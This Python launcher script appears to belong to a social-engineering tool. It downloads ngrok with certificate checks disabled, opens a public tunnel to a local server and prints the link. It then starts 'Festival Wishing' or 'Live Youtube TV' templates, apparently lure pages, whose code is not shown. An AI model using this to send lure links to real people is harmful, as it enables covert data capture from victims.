#!/usr/bin/python3

# Author: TheHackersBrain [Gaurav Raj]
# Website: thehackersbrain.pythonanywhere.com/
# Special Thanks to @techchipnet and @thelinuxchoice 


import os
import time
import json
from termcolor import colored
from sys import path
path.append('./dependencies/')
from banner import *


def ngrok_check():
    if 'ngrok' in os.listdir():
        pass
    else:
        print(
            f"\n{colored('[', 'green')}-{colored(']', 'green')} Ngrok not found, Downloading Ngrok...")
        print(f"""\n----- Device Type ------
{colored('[', 'green')}01{colored(']', 'green')} {colored('Android', 'yellow')}
{colored('[', 'green')}02{colored(']', 'green')} {colored('PC, Laptop', 'yellow')}
{colored('[', 'green')}03{colored(']', 'green')} {colored('Raspberry PI or Other SBC', 'yellow')}
""")
        choice = input(
            f"{colored('[', 'green')}+{colored('] Choose Device Type: ', 'green')}")
        if choice == "1" or choice == "01":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'yellow')}")
            os.system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            os.system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            os.system('chmod +x ngrok')
            os.system('rm -rf ngrok-stable-linux-arm.zip')
            ngrok_portfwd()
        elif choice == "2" or choice == "02":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'yellow')}")
            os.system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1')
            os.system('unzip ngrok-stable-linux-386.zip > /dev/null 2>&1')
            os.system('chmod +x ngrok')
            os.system('rm -rf ngrok-stable-linux-386.zip')
            ngrok_portfwd()
        elif choice == "3" or choice == "03":
            print(
                f"{colored('[', 'green')}+{colored('] Downloading Ngrok...', 'yellow')}")
            os.system(
                'wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            os.system('unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1')
            os.system('chmod +x ngrok')
            os.system('rm -rf ngrok-stable-linux-arm.zip')
            ngrok_portfwd()
        else:
            print(colored("Invalid Input, Try Again...", 'red'))


def ngrok_portfwd():
    os.system("./ngrok http 5000 > /dev/null &")
    time.sleep(10)
    os.system("curl -s http://localhost:4040/api/tunnels > tunnels.json")

    with open('tunnels.json') as data_file:
        datajson = json.load(data_file)

    link = ""
    for i in datajson['tunnels']:
        link = link + i['public_url'] + '\n'
    print(
        f"""{colored('[', 'green')}+{colored('] Direct Link: ', 'green')} {colored(link[29:], 'yellow')}""")


def fes_wish():
    fes_name = input(
        f"{colored('[', 'green')}+{colored('] Enter Festival Name: ', 'green')}")
    with open('templates/festival_wish/fes_name.txt', 'w') as data:
        data.write(fes_name)
    print(
        f"{colored('[', 'green')}+{colored('] Starting Festival Server...', 'green')}")
    ngrok_portfwd()
    os.system('cd templates/festival_wish/ ; python3 app.py')


def liveYt():
    vId = input(
        f"{colored('[', 'green')}+{colored('] Enter Video ID: ', 'green')}")
    with open('templates/liveYT/vID.txt', 'w') as data:
        data.write(vId)
    print(
        f"{colored('[', 'green')}+{colored('] Starting Youtube Server...', 'green')}")
    ngrok_portfwd()
    os.system('cd templates/liveYT/ ; python3 app.py')


def server():
    print(f"""----- Choose a template -----

{colored('[', 'green')}01{colored(']', 'green')} {colored('Festival Wishing', 'yellow')}
{colored('[', 'green')}02{colored(']', 'green')} {colored('Live Youtube TV', 'yellow')}
""")
    choice = input(
        f"{colored('[', 'green')}+{colored('] Choose a template', 'green')} [Default is 1]: ")
    if choice == '1' or choice == '01' or choice == '':
        fes_wish()
    elif choice == '2' or choice == '02':
        liveYt()
    else:
        print('Invalid Input, Please Try Again...')


if __name__ == "__main__":
    try:
        print(banner())
        ngrok_check()
        server()
    except Exception as err:
        print(err)
    except KeyboardInterrupt as keyerr:
        print("\nKeyboard Intrrupt Detected... Exiting...")
